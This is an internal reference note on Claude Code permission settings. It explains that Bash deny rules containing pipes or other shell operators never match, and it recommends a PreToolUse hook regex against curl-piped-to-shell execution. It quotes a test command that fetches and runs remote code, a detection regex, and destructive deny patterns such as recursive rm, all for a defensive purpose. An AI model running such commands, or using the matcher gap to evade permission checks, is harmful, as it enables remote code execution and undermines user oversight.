---
title: "Claude Code permission pipe-matching limitation (don't write `Bash(... | ...)` deny rules)"
applies_to: Claude Code permission system, all versions through 2.1.x (verified 2026-05-19)
created: 2026-05-22
last_updated: 2026-05-22
keywords: [claude-code, permissions, settings.json, deny, pipe, RCE, hooks, PreToolUse]
related:
  - "../home/hooks/pipe-rce-guard.sh"
---

# The rule (read this first)

**Any deny rule containing `|`, `&&`, `;`, or `||` is dead config.** Claude Code's `Bash(...)` permission patterns match each piped subcommand independently, not the full piped string. A deny like `Bash(curl * | sh*)` will **never** fire against `curl https://x | sh` — the matcher sees `curl https://x` and `sh` as separate checks, neither matches the composite pattern, the user gets a normal permission prompt instead of a hard deny.

# Why this is in docs, not memory

This is reference content with an active-use shape: it should fire automatically the next time permissions are audited, because the natural mistake is to write the dead pattern and assume it works. It was originally a Claude memory entry, promoted to docs on 2026-05-22 as part of a broader memory audit.

The behavior cue: if you're about to edit `settings.json` to add or audit deny rules, read this file first.

# Verification (2026-05-19)

Tested `curl https://example.com | sh` against deny pattern `Bash(curl * | sh*)`. Result: permission prompt appeared, no hard deny. Confirmed the matcher sees the pipe as a split point.

# What DOES work in deny patterns

Single-command deny patterns with mid-string globs work correctly:

```
Bash(find * -delete)        ← works, denies any find with -delete
Bash(rm -rf *)              ← works, denies recursive rm
Bash(sudo systemctl *)      ← works, denies any sudo systemctl invocation
```

The limitation is **specifically about composite commands joined by shell operators** (`|`, `&&`, `;`, `||`). Single-command patterns are fine.

# What to do instead for pipe-pattern RCE

Use a `PreToolUse` Bash hook that regexes the full command string before the matcher splits it. The working implementation on this machine is at `~/.claude/hooks/pipe-rce-guard.sh` — its regex matches:

```
(curl|wget|fetch) ... | (sudo )?(s?h|bash|zsh|ksh|dash)
```

Hooks receive the unmodified command string in their stdin JSON, so they can see the pipe operator and reject the whole composite. This is the only correct way to block `curl | sh`-style RCE attempts in Claude Code today.

Settings wiring (already present in this machine's `~/.claude/settings.json`):

```json
"hooks": {
  "PreToolUse": [
    {
      "matcher": "Bash",
      "hooks": [{"type": "command", "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/pipe-rce-guard.sh"}]
    }
  ]
}
```

# Audit checklist for the next permission review

When auditing auto-mode / permission settings:

1. Search `~/.claude/settings.json` and `~/.claude/settings.local.json` for any deny rule containing `|`, `&&`, `;`, or `||` — these are all dead config. Delete them.
2. For each dead rule, identify what threat it was supposed to block. If pipe-based (`curl | sh`, `wget | bash`), confirm `pipe-rce-guard.sh` covers it. If something else, write a new PreToolUse hook.
3. Single-command deny patterns are safe — leave them alone unless they're causing false positives.
4. Document any new hooks in this file's "what to do instead" section.

# Provenance

Originally documented as a Claude memory entry (created 2026-05-19). Promoted to docs on 2026-05-22 during a memory audit because the content is reference-with-active-use, not a behavioral rule that needs to fire every session.
